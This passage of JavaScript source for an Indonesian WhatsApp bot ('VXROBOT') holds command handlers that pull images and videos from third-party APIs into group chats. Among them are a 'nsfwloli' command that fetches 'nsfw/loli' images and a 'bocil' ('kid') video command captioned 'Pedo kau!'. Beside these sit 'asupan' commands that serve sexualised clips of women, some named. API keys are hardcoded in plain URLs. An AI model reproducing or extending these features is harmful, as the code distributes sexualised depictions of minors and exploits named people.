				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file'
				})

			break

		case 'dosa6':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file'
				})

			break

		case 'dosa7':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file'
				})

			break

		case 'dosa8':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file'
				})

			break

		case 'dosa10':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file'
				})

			break

		case 'dosa11':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file'
				})

			break

		case 'dosa12':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file'
				})

			break

		case 'dosa13':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file'
				})

			break

		case 'dosa14':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file'
				})

			break

		case 'dosa15':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file'
				})

			break*/
		case 'asupan':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			list = []
			listmenu = [
				`hijaber`,
				`cecanrandom`,
				`cecanvietnam`,
				`ukhty`,
				`ghea`,
				`rika`,
				`bocil`
			]
			listmenuu = [
				`Cewek Hijab`,
				`Cewek Random`,
				`Cewek Vietnam`,
				`Ukhty`,
				`Ghea`,
				`Rika`,
				`Bocil`
			]
			nombor = 1
			startnum = 0
			for (let x of
					listmenu) {
				const yy = {
					title: 'Silahkan Dipilih' +
						nombor++,
					rows: [
					{
						title: `${listmenuu[startnum++]}`,
						description: ``,
						rowId: `${prefix}${x}`
					}]
				}
				list.push(yy)
			}
			listmsg(from,
				`${ucapanWaktu} @${sender.split('@')[0]}`,
				`\n\nSilahkan pilih salah satu dibawah ini`,
				list)
			break

			//━━━━━━━━━━━━━━━[ BAHAN ASUPAN ]━━━━━━━━━━━━━━━━━//
		case 'cecanvietnam':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			huft =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=ZeroYT7`
					)
			reply(mess.wait)
			goo =
				await getBuffer(
					huft.result
					.url)
			varo.sendMessage(
				from, goo,
				image, {
					quoted: mek,
					caption: 'Cecan Vietnam>//<'
				})
				limitAdd(sender,
					limit)
			break
		case 'cecanrandom':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=ZeroYT7`
					)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			varo.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: 'Random~'
				})
				limitAdd(sender,
					limit)
			break
		case 'hijaber':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=ZeroYT7`
					)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			varo.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: 'Cecan Hijab>//<'
				})
				limitAdd(sender,
					limit)
			break
		/*case 'santuy':
			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=ZeroYT7`
					)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			varo.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Nih Jangan Sampe Berdiri yah anunya (≧▽≦)'
				})
			break*/
		case 'ukhti':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=ZeroYT7`
					)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			varo.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Ukhtyy>//<'
				})
				limitAdd(sender,
					limit)
			break
		case 'bocil':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=ZeroYT7`
					)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			varo.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Pedo kau!'
				})
				limitAdd(sender,
					limit)
			break
		case 'ghea':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=ZeroYT7`
					)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			varo.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Gheaa>//<'
				})
				limitAdd(sender,
					limit)
			break
		case 'rika':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			ini =
				await fetchJson(
					`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=ZeroYT7`
					)
			reply(mess.wait)
			buffer =
				await getBuffer(
					ini.result
					.url)
			varo.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek,
					caption: 'Rikaa>//<'
				})
				limitAdd(sender,
					limit)
			break

		//case 'storyanime':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			reply(mess.wait)
			anu =
				await fetchJson(
					`http://api.lolhuman.xyz/api/storynime?apikey=vxro2k21`
					)
			buffer =
				await getBuffer(
					anu.result)
			varo.sendMessage(
				from,
				buffer,
				video, {
					quoted: mek
				})
				
				limitAdd(sender,
					limit)
			break



		/*case 'otakuongoing':
			o = await onGoing()
			console.log(o)
			ot = '*「 Ongoing Otakudesu 」*'
			for (let i = 0; i <
				o.length; i++) {
				ot +=
					`\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
			}
			buff =
				await getBuffer(
					o[0].thumb)
			varo.sendMessage(
				from, buff,
				image, {
					quoted: mek,
					caption: ot
				})
			break*/
		case 'waifu':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			reply(mess.wait)
			v = await fetchJson(
				`https://api.waifu.pics/sfw/waifu`
				)
			inifile =
				sendMediaURL(
					from, v.url,
					)
			buttons = [{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `➡️Next`
				},
				type: 1
			}, {
				buttonId: `${prefix}g`,
				buttonText: {
					displayText: 'STOP'
				},
				type: 1
			}]
			imageMsg = (
					await varo
					.prepareMessage(
						from,
						inifile,
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
									)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: 'VXROBOT©2022',
				imageMessage: imageMsg,
				contentText: `Klik next untuk gambar selanjutnya`,
				buttons,
				headerType: 4
			}
			prep = await varo
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			varo
				.relayWAMessage(
					prep)
			fs.unlinkSync(
				`./${sender}.jpeg`
				)
			break
		case 'loli':
		case 'husbu':
		case 'milf':
		case 'cosplay':
		case 'wallml':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			reply(mess.wait)
			//    if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://varo-chan02.github.io`)
			let wipu = (
				await axios
				.get(
					`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`
					)).data
			let wipi = wipu[Math
				.floor(Math
					.random() *
					(wipu
						.length
						))]
			fs.writeFileSync(
				`./${sender}.jpeg`,
				await getBuffer(
					wipi))
			buttons = [			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			},
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			},]
			imageMsg = (
					await varo
					.prepareMessage(
						from, fs
						.readFileSync(
							`./${sender}.jpeg`
							),
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
									)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: `${fake}`,
				imageMessage: imageMsg,
				contentText: `「❗」 ${command}`,
				buttons,
				headerType: 4
			}
			prep = await varo
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			varo
				.relayWAMessage(
					prep)
			fs.unlinkSync(
				`./${sender}.jpeg`
				)
			break
		/*case "remm":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix}vampire teks`,
					mek)
			reply(mess.wait)
			bapakao = body
				.slice(6)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gfx5?apikey=hardianto&text=${bapakao}`
				)
			break
		case "lolim":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix + command}teks`,
					mek)

			reply(mess.wait)
			bapakao = body
				.slice(7)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gfx2?apikey=hardianto&nama=${bapakao}`
				)
			break
		case "kaneki":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix + command}teks`,
					mek)
			reply(mess.wait)
			bapakao = body
				.slice(8)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gfx1?apikey=hardianto&nama=${bapakao}`
				)
			break
		case "gura":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix + command}teks`,
					mek)

			reply(mess.wait)
			bapakao = body
				.slice(6)
			sendMediaURL(from,
				`https://hardianto-chan.herokuapp.com/api/bot/gura?apikey=hardianto&nama=${bapakao}`
				)
			break*/
		case "nekonime":
			if (isBanned) return reply(mess.baned)

            nekoo = await fetchJson(`https://nekos.life/api/v2/img/neko`)
			ini_url = nekoo.url
			ini_buffer =
				await getBuffer(
					ini_url)
			await varo
				.sendMessage(
					from,
					ini_buffer,
					image, {caption:'Anime Neko',
						quoted: mek
					})
			break
		/*case "bajingan":

			if (args.length < 1)
				return reply(
					from,
					`Penggunaan ${prefix}bajingan lu teks`,
					mek)
			bapakao = body
				.slice(10)
			sendStickerFromUrl(
				from,
				`https://hardianto-chan.herokuapp.com/api/creator/memegen?bawah=${bapakao}&atas=bajingan&imgurl=https://telegra.ph/file/d608ec3cb57ff6b9ac708.jpg&apikey=hardianto`
				)
			reply(
				"Succes Buat Fitur Bajingan,")
			break*/

		case 'quotesanime': {
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
					)
					reply(mess.wait)
			let anu =
				await axios.get(
					`https://api.lolhuman.xyz/api/random/quotesnime?apikey=vxro2k21`
					)
			hehq =
				`*Quotes* : _${anu.data.result.quote}_\n\n*Karakter* : _―${anu.data.result.character}_\n\n*Anime* : _―${anu.data.result.anime}_\n\n*Episode* : _―${anu.data.result.episode}_`
			button = [
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			},
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${hehq}`,
				footerText: `VXROBOT©2022`,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})

			break
		}
		case 'quotesyt':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			reply(mess.wait)
			dapuhy =
				await getBuffer(
					`https://api.dapuhy.ga/api/randomimage/quotesyt?apikey=vxrobot2k21`
					)
			let xixi =
				await varo
				.prepareMessageMedia(
					dapuhy,
					image, {
						thumbnail: thumb
					})
			let but = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}]
			let buttonMessages = {
				contentText: 'Quotes dari komen YouTube',
				footerText: `${fake}`,
				buttons: but,
				headerType: 4,
				...xixi
			}
			varo.sendMessage(
				from,
				buttonMessages,
				MessageType
				.buttonsMessage, {
					quoted: mek,
					thumbnail: thumb
				})

			break

		case 'quoteslucu': {
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
					)
					reply(mess.wait)
			let anu =
				await axios.get(
					`https://api.dapuhy.ga/api/fun/quoteslucu?apikey=vxrobot2k21`
					)
			hehq =
				`${anu.data.quotes}`
			button = [
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			},
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${hehq}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})

			break
		}
		// Random Text //
		case 'quotes':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			quotes =
				await fetchJson(
					`https://api.lolhuman.xyz/api/random/quotes?apikey=vxro2k21`
					)
			quotes = quotes
				.result
			author = quotes.by
			quotes = quotes
				.quote
			hehe =
				`_${quotes}_\n\n*― ${author}*`
			button = [
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			},
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${hehe}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})

			break;
		case 'clearall':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			anu = await varo
				.chats.all()
			varo
				.setMaxListeners(
					26)
			for (let _ of anu) {
				varo
					.deletechat(
						_.jid)
			}
			reply(
				'Sukses membersihkan semua pesan')
			break

		case 'quotesislami':
			if (isBanned) return reply(mess.baned)

			quotes =
				await fetchJson(
					`https://api.lolhuman.xyz/api/random/quotes?apikey=vxro2k21`
					)
			quotes = quotes
				.result
			author = quotes.by
			quotes = quotes
				.quote
			heha =
				`_${quotes}_\n\n*― ${author}*`
			button = [
				{
					buttonId: `y`,
					buttonText: {
						displayText: '️❌ 𝑺𝒕𝒐𝒑'
					},
					type: 1
				},
				{
					buttonId: `${prefix+command}`,
					buttonText: {
						displayText: '️➡️ 𝑵𝒆𝒙𝒕'
					},
					type: 1
				}, ]
			buttons = {
				contentText: `${heha}`,
				footerText: `${fake}`,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})

			break;


		case 'quotesimage':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			reply(mess.wait)
			yang =
				await getBuffer(
					`https://api.lolhuman.xyz/api/random/${command}?apikey=vxro2k21`
					)
			let yag =
				await varo
				.prepareMessageMedia(
					yang,
					image, {
						thumbnail: thumb
					})
			let ge = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}]
			let gb = {
				contentText: 'Quotes Image',
				footerText: `${fake}`,
				buttons: ge,
				headerType: 4,
				...yag
			}
			varo.sendMessage(
				from, gb,
				MessageType
				.buttonsMessage, {
					quoted: mek,
					thumbnail: thumb
				})
			break

		case 'storyanime':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`
					)
			reply(mess.wait)
			kntl =
				await fetchJson(
					`https://api.lolhuman.xyz/api/storynime?apikey=vxro2k21`
					)
			kntl = await getBuffer(kntl.result)
			let xixiu =
				await varo
				.prepareMessageMedia(
					kntl,
					video)
			let bot = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			}]
			let buttonMessagees = {
				contentText: 'Story Anime',
				footerText: `${fake}`,
				buttons: bot,
				headerType: 4,
				...xixiu
			}
			varo.sendMessage(
				from,
				buttonMessagees,
				MessageType
				.buttonsMessage, {
					quoted: mek})
				limitAdd(sender,
					limit)
			break

			/*case 'asupan':
			case 'asupansantuy':
			case 'asupanbocil':
			case 'asupanukhty':
			case 'asupanghea':

			kntl = await getBuffer(`https://api.dapuhy.ga/api/asupan/${command}?apikey=vxrobot2k21`)                    
			mhan2 = await varo.prepareMessage(from, kntl, video, { thumbnail: Mfake })
			ggbutsan = [
			{buttonId: `${prefix+command}`, buttonText: {displayText: '➡️ 𝑵𝒆𝒙𝒕'}, type: 1},
			{buttonId: `y`, buttonText: {displayText: '️❌ 𝑺𝒕𝒐𝒑'}, type: 1},
			]
			gbbuttonan = {
			videoMessage : mhan2.message.videoMessage,
			contentText: `CLICK NEXT UNTUK MELANJUTKAN`,
			footerText: `${fake}`,
			buttons: ggbutsan,
			headerType: 5
			}
			await varo.sendMessage(from, gbbuttonan, MessageType.buttonsMessage, {
			quoted: mek, contextInfo: { mentionedJid: [sender]}})
			limitAdd(sender, limit)
			break
			case 'asupanrika':

			kntl = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupanrikagusriani?apikey=vxrobot2k21`)                    
			mhan2 = await varo.prepareMessage(from, kntl, video, { thumbnail: Mfake })
			ggbutsan = [
			{buttonId: `${prefix+command}`, buttonText: {displayText: '➡️ 𝑵𝒆𝒙𝒕'}, type: 1},
			{buttonId: `y`, buttonText: {displayText: '️❌ 𝑺𝒕𝒐𝒑'}, type: 1},
			]
			gbbuttonan = {
			videoMessage : mhan2.message.videoMessage,
			contentText: `CLICK NEXT UNTUK MELANJUTKAN`,
			footerText: `${fake}`,
			buttons: ggbutsan,
			headerType: 5
			}
			await varo.sendMessage(from, gbbuttonan, MessageType.buttonsMessage, {
			quoted: mek, contextInfo: { mentionedJid: [sender]}})
			limitAdd(sender, limit)
			break*/
		case 'nsfwloli':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
            reply(mess.wait)
			anu =
				await getBuffer(
					`https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=vxro2k21`
					)
			buttons = [			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			},
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			},]
			imageMsg = (
					await varo
					.prepareMessage(
						from,
						anu,
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
									)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: `${fake}`,
				imageMessage: imageMsg,
				contentText: `「❗」 NSFW Loli`,
				buttons,
				headerType: 4
			}

			prep = await varo
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek,
						/*contextInfo: {
							"externalAdReply": {
								"title": `Nih Kak ${pushname}`,
								mediaType: 2,
								"thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg",
								"previewType": "VIDEO",
								"mediaUrl": `https://youtu.be/HEq3zZ_0WCU`
							}
						}*/
					})
					limitAdd(sender,
						limit)
			varo
				.relayWAMessage(
					prep)

			break
		case 'antidelete':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return freply(
					'Pilih on atau off'
					)
			if (args[0] ===
				"on") {
				if (antidel ===
					true) return
				antidel = true
				freply(
					`Succes mengaktifkan antidelete`)
			} else if (args[
				0] === "off") {
				if (antidel ===
					false)
					return
				antidel = false
				freply(
					`Succes mematikan antidelete`)
			} else {
				freply(
					`Pilih on atau off`)
			}
			break
		case 'autoread':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			if (args.length < 1)
				return reply(
					`Example:\n${prefix}autoread gc on`
					)
			if (args[0] ===
				"gc") {
				if (args
					.length < 2)
					return reply(
						`Example:\n${prefix}autoread gc on`
						)
				if (args[1] ===
					"on") {
					if (readG ===
						true)
						return
					readG = true
					reply(
						`Succes mengaktifkan autoread group`)
				} else if (args[
						1] ===
					"off") {
					if (readG ===
						false)
						return
					readG =
						false
					reply(
						`Succes mematikan autoread group`)
				} else {
					reply(
						`Pilih on atau off`)
				}
			} else if (args[
				0] === "pc") {
				if (args
					.length < 2)
